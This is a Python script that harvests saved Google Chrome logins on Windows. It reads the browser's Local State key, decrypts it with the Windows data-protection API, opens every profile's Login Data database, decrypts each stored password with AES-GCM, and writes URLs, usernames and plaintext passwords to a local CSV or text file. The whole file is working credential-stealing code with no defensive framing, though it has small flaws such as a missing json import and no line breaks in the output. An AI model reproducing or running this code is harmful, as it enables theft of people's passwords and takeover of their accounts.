import os
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES

class chrome_passwords(object):
    def __init__(
        self, 
        query="SELECT origin_url, username_value, password_value FROM logins"
    ):
        self.folder_path = os.path.join(
            os.path.expanduser("~"),
            "AppData", "Local",
            "Google", "Chrome",
            "User Data"
        )
        self.query=query
        self.credentials = []

    def get_master_key(self):
        local_state_path = os.path.join(self.folder_path, "Local State")
        with open(local_state_path) as state_file:
            local_state = state_file.read()
            local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        decrypted_master_key = win32crypt.CryptUnprotectData(
            master_key, None, None, None, 0
            )[1]
        return decrypted_master_key

    def decrypt_password(self, encrypted_password, master_key):
        iv = encrypted_password[3:15]
        payload = encrypted_password[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(payload)
        return decrypted_password[:-16]

    def generate_db_paths(self):
        db_paths = []
        dir_items = os.listdir(self.folder_path)
        for dir_item in dir_items:
            db_path = os.path.join(self.folder_path, dir_item, "Login Data")
            if os.path.isfile(db_path):
                db_paths.append(db_path)
        return db_paths

    def get_passwords(self):
        master_key = self.get_master_key()
        db_paths = self.generate_db_paths()
        for db_path in db_paths:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            cursor.execute(self.query)
            credentials = cursor.fetchall()
            cursor.close()
            conn.close()
            if len(credentials)>0:
                for cred in credentials:
                    credential = {}
                    credential["url"] = cred[0]
                    credential["username"] = cred[1]
                    credential["password"] = self.decrypt_password(cred[2], master_key)
                    self.credentials.append(credential)
        return self.credentials

    @staticmethod
    def export_passwords(passwords, format_=".csv"):
        supported_formats = [".csv", ".txt"]
        if format_ in supported_formats:
            if format_ == ".txt" or format_ == ".csv":
                filename = "password" + format_
                with open(filename, 'w') as out_file:
                    for password in passwords:
                        line = (
                            str(password["url"]) + "," + 
                            str(password["username"]) + "," +
                            str(password["password"])
                        )
                        out_file.write(line)

if __name__ == "__main__":
    cp = chrome_passwords()
    passwords =  cp.get_passwords()
    cp.export_passwords(passwords)